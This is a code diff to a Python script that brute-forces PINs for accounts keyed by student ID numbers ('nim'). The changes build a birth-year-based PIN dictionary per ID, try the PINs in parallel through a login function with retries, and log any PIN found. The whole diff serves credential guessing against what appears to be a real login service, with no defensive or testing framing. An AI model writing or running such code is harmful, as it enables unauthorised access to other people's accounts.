@@ -40,8 +40,10 @@ def init_logging():
     rootLogger.setLevel(logging.INFO)
 
 
-def init_dictionary(start_year=92, end_year=99):
-    global DICTIONARY
+def init_dictionary(nim="160000000"):
+    nim = str(nim)
+    start_year = int(nim[:2]) + 81
+    end_year = int(nim[:2]) + 83
 
     start_time = time.time()
     DICTIONARY = []
@@ -70,8 +72,9 @@ def init_dictionary(start_year=92, end_year=99):
     DICTIONARY = list(set(DICTIONARY))
     total_time = time.time()-start_time
 
-    logging.info("Dictionary generated {} values in {}s"
-          .format(len(DICTIONARY), total_time))
+    logging.info("Dictionary generated {} values in {}s for {}"
+          .format(len(DICTIONARY), total_time, nim))
+    return DICTIONARY
 
 
 def login(pin, depth=0):
@@ -90,6 +93,7 @@ def login(pin, depth=0):
                 SHARED.found = True
                 return pin
         except (requests.ConnectTimeout or requests.ConnectionError):
+            logging.warning('Connection Problem occured, {} of {} retries'.format(depth, MAX_RETRY))
             if depth < MAX_RETRY:
                 depth += 1
                 return login(pin, depth=depth)
@@ -97,7 +101,6 @@ def login(pin, depth=0):
 
 def brute(nim):
     global PROCESS_COUNT
-    global DICTIONARY
     global SHARED
     global NIM
 
@@ -123,6 +126,7 @@ def brute(nim):
         else:
             logging.warning('Saved pin is bad, trying normal method.')
 
+    DICTIONARY = init_dictionary(nim)
     with multiprocessing.Pool(PROCESS_COUNT) as pool:
         result = list(pool.map(login, DICTIONARY))
 
@@ -135,7 +139,7 @@ def brute(nim):
             logfile.write(result[0])
             logging.info('Found %s %d' % (NIM, pin))
     else:
-        logging.warning('Failed %s' % (NIM))
+        logging.info('Failed %s' % (NIM))
     logging.info("Finished %s in %.2fs" % (NIM, total_time))
 
 
@@ -178,7 +182,6 @@ def main():
     args = parse_argument()
 
     init_logging()
-    init_dictionary()
     init_global_argument(args)
 
     # parse and gather all target
